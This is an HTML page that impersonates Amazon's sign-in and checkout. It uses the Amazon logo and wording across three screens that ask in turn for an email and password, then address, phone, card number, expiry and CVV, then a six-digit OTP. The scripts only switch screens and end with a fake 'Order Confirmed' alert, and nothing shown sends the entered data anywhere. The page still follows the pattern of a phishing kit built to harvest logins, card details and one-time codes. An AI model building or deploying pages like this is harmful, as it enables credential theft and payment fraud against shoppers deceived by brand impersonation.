<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon-Inspired Multi-Step Page</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" type="image/svg+xml">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #fff;
            border: 1px solid #ddd;
            padding: 20px;
            width: 100%;
            max-width: 360px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
        }

        .amazon-logo {
            display: block;
            margin: 0 auto 15px auto;
            max-width: 100px;
        }

        h1 {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
            text-align: center;
        }

        label {
            display: block;
            font-size: 12px;
            margin-bottom: 5px;
            color: #555;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #ffa41c;
            border: none;
            color: #fff;
            font-size: 14px;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #f08804;
        }

        .footer {
            font-size: 11px;
            color: #555;
            margin-top: 10px;
            text-align: center;
        }

        .footer a {
            color: #0066c0;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none;
        }

        .otp-bar {
            display: flex;
            justify-content: center;
            gap: 6px;
        }

        .otp-bar input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .otp-bar input:focus {
            border-color: #ffa41c;
            outline: none;
        }
    </style>
    <script>
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
            document.getElementById(pageId).classList.remove('hidden');
        }

        function goToBillingAndPayment() {
            showPage('billing-payment-page');
        }

        function goToOTP() {
            showPage('otp-page');
        }

        function confirmOrder() {
            alert('Order Confirmed! Thank you for shopping with Amazon.');
        }
    </script>
</head>
<body>
    <div class="container">
        <!-- Login Page -->
        <div id="login-page" class="page">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="amazon-logo">
            <h1>Sign-In</h1>
            <form onsubmit="event.preventDefault(); goToBillingAndPayment();">
                <label for="email">Email or mobile phone number</label>
                <input type="email" id="email" name="email" required>

                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>

                <button type="submit">Sign-In</button>
            </form>
            <div class="footer">
                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
            </div>
        </div>

        <!-- Billing and Payment Page -->
        <div id="billing-payment-page" class="page hidden">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="amazon-logo">
            <h1>Billing & Payment</h1>
            <form onsubmit="event.preventDefault(); goToOTP();">
                <label for="address">Address</label>
                <input type="text" id="address" name="address" required>

                <label for="city">City</label>
                <input type="text" id="city" name="city" required>

                <label for="state">State</label>
                <input type="text" id="state" name="state" required>

                <label for="zip">Zip Code</label>
                <input type="text" id="zip" name="zip" required>

                <label for="phone">Phone Number</label>
                <input type="text" id="phone" name="phone" required>

                <label for="card">Credit/Debit Card Number</label>
                <input type="text" id="card" name="card" required>

                <label for="expiry">Expiry Date</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>

                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" required>

                <button type="submit">Next</button>
            </form>
        </div>

        <!-- OTP Verification Page -->
        <div id="otp-page" class="page hidden">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="amazon-logo">
            <h1>OTP Verification</h1>
            <p>We have sent a 6-digit OTP to your registered email/phone number. Please enter it below:</p>
            <form onsubmit="event.preventDefault(); confirmOrder();">
                <div class="otp-bar">
                    <input type="text" maxlength="1" required>
                    <input type="text" maxlength="1" required>
                    <input type="text" maxlength="1" required>
                    <input type="text" maxlength="1" required>
                    <input type="text" maxlength="1" required>
                    <input type="text" maxlength="1" required>
                </div>
                <button type="submit">Verify</button>
            </form>
        </div>
    </div>
</body>
</html>
